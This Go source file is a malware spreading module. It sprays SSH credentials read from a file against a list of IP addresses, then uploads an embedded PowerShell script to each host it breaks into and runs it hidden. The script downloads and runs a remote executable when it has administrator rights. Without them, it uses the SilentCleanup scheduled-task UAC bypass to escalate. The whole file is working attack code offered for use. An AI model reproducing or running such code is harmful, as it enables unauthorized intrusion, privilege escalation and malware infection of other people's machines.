package pack

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io"
	"os"
	"strings"

	"github.com/pkg/sftp"
)

// PS1ScriptContent contains the PowerShell script content
const PS1ScriptContentSSH = `
if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
	# URL of the executable to download
   $url = "https://sourceforge.net/projects/app/files/main.exe/download"
   
   # Path to save the downloaded executable
   $downloadPath = "$env:TEMP\downloaded_System.exe"
   
   # Download the executable
   Invoke-WebRequest -Uri $url -OutFile $downloadPath
   
   # Run the downloaded executable
   Start-Process -FilePath $downloadPath -NoNewWindow -Wait
   
   # Remove the downloaded file (optional)
   Remove-Item -Path $downloadPath -Force
   
   
   } else {
	   $registryPath = "HKCU:\Environment"
	   $Name = "windir"
	   $Value = "powershell -ep bypass -w h $PSCommandPath;#"
	   Set-ItemProperty -Path $registryPath -Name $name -Value $Value
	   #Depending on the performance of the machine, some sleep time may be required before or after schtasks
	   schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
	   Remove-ItemProperty -Path $registryPath -Name $name
   }
`

func SSH() {
	// Read SSH server IPs from file
	ipFile, err := os.Open("sship.txt")
	if err != nil {
		fmt.Println("Error reading SSH server IPs file:", err)
		return
	}
	defer ipFile.Close()

	scanner := bufio.NewScanner(ipFile)
	for scanner.Scan() {
		sshIP := strings.TrimSpace(scanner.Text())

		// Read SSH credentials from file
		credFile, err := os.Open("ssh.txt")
		if err != nil {
			fmt.Println("Error reading SSH credentials file:", err)
			return
		}
		defer credFile.Close()

		credScanner := bufio.NewScanner(credFile)
		for credScanner.Scan() {
			cred := strings.TrimSpace(credScanner.Text())
			creds := strings.Split(cred, ":")
			if len(creds) != 2 {
				fmt.Println("Invalid credentials format:", cred)
				continue
			}

			sshUser := creds[0]
			sshPassword := creds[1]

			// Connect to SSH server
			client, err := connectSSH(sshIP, 22, sshUser, sshPassword)
			if err != nil {
				fmt.Printf("Failed to connect to %s: %v\n", sshIP, err)
				continue
			}
			defer client.Close()

			// Set the remote file path for the PS1 script on the SSH server
			remoteFileName := "script.ps1"
			remoteFilePath := "/" + remoteFileName

			// Upload PS1 script content to the remote file
			err = uploadFileOverSFTP(client, remoteFilePath, PS1ScriptContentSSH)
			if err != nil {
				fmt.Printf("Failed to upload PS1 script content to %s: %v\n", sshIP, err)
				return
			}

			fmt.Printf("PS1 script uploaded successfully to %s on %s\n", remoteFilePath, sshIP)

			// Execute PowerShell script remotely
			err = executeScriptOverSSH(client, remoteFilePath)
			if err != nil {
				fmt.Printf("Failed to execute PowerShell script on %s: %v\n", sshIP, err)
				return
			}

			// Break out of the credential loop if successful login, upload, and execution
			break
		}
	}
}

func connectSSH(host string, port int, user, password string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	return ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, port), config)
}

func uploadFileOverSFTP(client *ssh.Client, remoteFilePath, content string) error {
	sftpClient, err := sftp.NewClient(client)
	if err != nil {
		return err
	}
	defer sftpClient.Close()

	remoteFile, err := sftpClient.Create(remoteFilePath)
	if err != nil {
		return err
	}
	defer remoteFile.Close()

	_, err = io.WriteString(remoteFile, content)
	return err
}

func executeScriptOverSSH(client *ssh.Client, scriptPath string) error {
	session, err := client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	// Execute the PowerShell script with hidden window
	cmd := "powershell.exe -WindowStyle Hidden -File " + scriptPath

	err = session.Run(cmd)
	return err
}
